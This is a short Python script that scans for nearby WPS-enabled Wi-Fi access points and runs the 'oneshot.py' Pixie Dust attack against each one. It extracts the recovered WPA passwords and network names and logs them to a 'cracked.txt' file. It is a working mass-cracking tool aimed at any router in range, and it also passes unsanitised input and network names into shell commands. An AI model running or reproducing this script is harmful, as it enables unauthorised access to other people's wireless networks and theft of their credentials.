import os

class c:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def getMac(path):
  f = open(path)
  a = f.read()
  a=a.replace("OBSS", "").replace("* BSS", "").replace("* BSS", "").replace("Overlapping BSS","").replace("BSS Load:","")
  b=a.split("BSS ")
  maclist = []
  for i in b:
    if "WPS:" in i:
       c2=i.split("\n")
       maclist.append(c2[0].split("(")[0])
  return maclist

wifi=input("wifi adapter: ")

os.system("sudo rm ap ; sudo iw dev wlp3s0u2 scan > ap")
macs=getMac("ap")
p=0
for i in macs:
  p=p+1
  print("Сканирование "+str(p)+"/"+str(len(macs))+": "+i)
  if (i in open("cracked.txt").read()):
     print(c.OKBLUE+"already hacked!!!"+c.ENDC) 
     continue
  os.system("sudo python3 oneshot.py -i "+wifi+" -b "+i+" -K > rez/"+i)#wlp3s0u2


files=os.listdir("rez")
for i in files:
   
    PSK=""
    ESSID=""
    for line in open("rez/"+i): 
            if "WPA PSK:" in line:PSK = line
    for line in open("rez/"+i): 
            if "AP SSID:" in line:ESSID = line
    if not(PSK==""):
       PSK=PSK.replace("'", "").replace("[+] WPA PSK: ", "").replace("\n", "")
       ESSID=ESSID.replace("'", "").replace("[+] AP SSID: ", "").replace("\n", "")
       print(i+" - "+ESSID+" - "+PSK+"\n")
       
       if not(ESSID in open("cracked.txt").read()):
         os.system("echo '"+i+" - "+ESSID+" - "+PSK+"' >> cracked.txt")
   
